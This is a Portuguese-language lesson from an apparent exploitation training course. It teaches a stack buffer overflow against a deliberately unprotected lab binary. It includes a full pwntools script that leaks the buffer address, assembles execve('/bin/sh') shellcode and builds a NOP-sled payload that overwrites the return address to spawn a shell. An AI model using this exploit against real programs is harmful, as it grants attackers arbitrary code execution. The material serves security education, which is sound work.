# Buffer overflow: injetar shellcode e abrir shell

No modulo 15 voce pulou para o buffer e executou um shellcode que so imprimia uma
mensagem. Agora voce injeta o shellcode de verdade - o `execve("/bin/sh")` do
modulo 2 - e usa um **NOP sled** (modulo 13) para nao depender de acertar o byte
exato do inicio.

## O plano

```
buffer: [ NOP sled ][ execve("/bin/sh") ][ NOPs ][ ret = buf ]
          ^-- buf                                 ^-- offset 136
```

O retorno aponta para `buf` (inicio do sled); a CPU desliza pelos `nop` ate o
shellcode, que abre `/bin/sh`. O shell herda o `stdin` do processo, entao o checker
consegue mandar um comando (`echo BOF_SHELL_OK`) e ver a resposta - exatamente como
nos modulos 2 e 7.

## O que voce precisa fazer

```python
from pwn import asm, p64, context
import subprocess, re

context.arch = "amd64"
subprocess.run(["gcc", "-O0", "-fno-stack-protector", "-no-pie", "-z", "execstack",
                "/challenge/vuln.c", "-o", "/tmp/vuln"], check=True)

open("/home/hacker/payload.bin", "wb").write(b"\x90" * 8)
leak = subprocess.run(["/tmp/vuln", "/home/hacker/payload.bin"],
                      capture_output=True).stderr.decode()
buf = int(re.search(r"buf = (0x[0-9a-f]+)", leak).group(1), 16)

shellcode = asm('''
    xor rdx, rdx
    push rdx
    mov rbx, 0x68732f2f6e69622f
    push rbx
    mov rdi, rsp
    push rdx
    push rdi
    mov rsi, rsp
    mov eax, 59
    syscall
''')

offset = 136
sled = b"\x90" * 32
body = sled + shellcode
payload = body + b"\x90" * (offset - len(body)) + p64(buf)
open("/home/hacker/payload.bin", "wb").write(payload)
```

## Fluxo completo

```bash
python3 /home/hacker/solve.py
/challenge/check
```

## Por que isto importa

Esta e a cadeia completa de um stack overflow com injecao de codigo: corromper o
retorno, pousar no sled e executar shellcode arbitrario com os privilegios e
descritores do processo. E o cenario que NX (pilha nao executavel) foi criado para
matar: com NX ligado, o buffer na pilha nao seria executavel e este payload falharia
no primeiro byte do shellcode.
